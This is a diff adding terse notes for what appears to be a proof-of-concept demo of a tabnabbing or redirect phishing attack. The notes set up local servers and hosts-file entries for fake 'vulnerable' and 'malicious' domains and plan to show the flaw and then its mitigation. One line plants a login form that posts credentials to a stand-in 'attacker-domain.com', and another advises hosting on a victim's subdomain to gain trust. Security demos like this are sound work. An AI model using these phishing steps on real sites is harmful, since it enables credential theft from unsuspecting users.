@@ -1,0 +1,45 @@
+python3 -m http.server
+http://192.168.29.189:8000/
+
+python3 -m http.server 8000 - Project1
+python3 -m http.server 8000 - Project2
+
+Directory listing for /
+.idea/
+main.py
+malicious_redir.html
+malicious_site.html
+meta
+vulnerable_site.html
+
+https://kinsta.com/knowledgebase/edit-mac-hosts-file/
+sudo nano /etc/hosts
+SERVER_IP_ADDRESS domain.com
+Flush Your DNS Cache
+sudo killall -HUP mDNSResponder
+
+
+Show vulnerable
+Then
+Mitigate
+
+192.168.29.189 vulnerable_website.com
+192.168.29.189 malicious_website.com
+
+http://vulnerable_website.com:8000/
+http://vulnerable_website.com:8000/entry.html
+http://vulnerable_website.com:8000/test?willgointohref=checking
+http://vulnerable_website.com:8000/vulnerable_site.html
+
+http://malicious_website.com:8001/malicious_site.html    || opens in new tab
+http://malicious_website.com:8001/malicious_redir.html   || opens in same original tab where original website was opened
+To establish trust , host on subdomain of victim site
+
+
+Place a login form inside malicious_redir.html
+<form method="POST" action="https://attacker-domain.com/login_submit.php">
+
+Video POC
+issue then mitigate
+
+identify with cyclops
